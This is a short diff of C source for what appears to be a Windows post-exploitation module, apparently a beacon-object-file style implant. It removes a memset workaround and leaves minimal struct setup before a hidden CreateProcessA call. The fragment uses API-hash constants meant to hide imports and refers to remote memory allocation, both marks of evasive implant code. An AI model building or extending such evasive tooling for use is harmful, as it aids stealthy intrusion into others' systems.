@@ -18,16 +18,6 @@
 #include <windows.h>
 #include <intrin.h>
 
-/* defined (not UNDEF): the compiler folds struct/array sweeps into memset
- * calls; a local definition satisfies them and - as the staged build
- * proved - a defined local function with relocs against it packs fine */
-void *memset(void *d, int c, size_t n)
-{
-	volatile char *p = (volatile char *)d;
-	while (n--)
-		*p++ = (volatile char)c;
-	return d;
-}
 
 #define BW_H_CREATEPROCESSA       0x16B3FE72UL
 #define BW_H_VIRTUALALLOCEX       0x6E1A959CUL
@@ -206,17 +196,11 @@ void go(char *args, int len)
 		pCH(f);
 	}
 
-	/* zero the structs through a volatile byte loop: a plain field sweep
-	 * gets folded into a memset call, and memset would be an UNDEF symbol
-	 * the packer refuses with 'Unknown symbol' */
-	{
-		volatile char *vp = (volatile char *)&si;
-		for (mlen = 0; mlen < (DWORD)sizeof si; mlen++)
-			vp[mlen] = 0;
-		vp = (volatile char *)&pi;
-		for (mlen = 0; mlen < (DWORD)sizeof pi; mlen++)
-			vp[mlen] = 0;
-	}
+	/* NO struct zeroing at all: any sweep pattern folds into an UNDEF
+	 * memset the packer refuses. CreateProcessA only reads si.cb plus the
+	 * fields dwFlags gates - setting dwFlags=0 first makes every other
+	 * field dead, and pi is pure output */
+	si.dwFlags = 0;
 	si.cb = sizeof(BW_STARTUPINFOA);
 
 	if (!pCP(NULL, g_cmdline, NULL, NULL, FALSE, 0x08000000, NULL, NULL, &si, &pi))
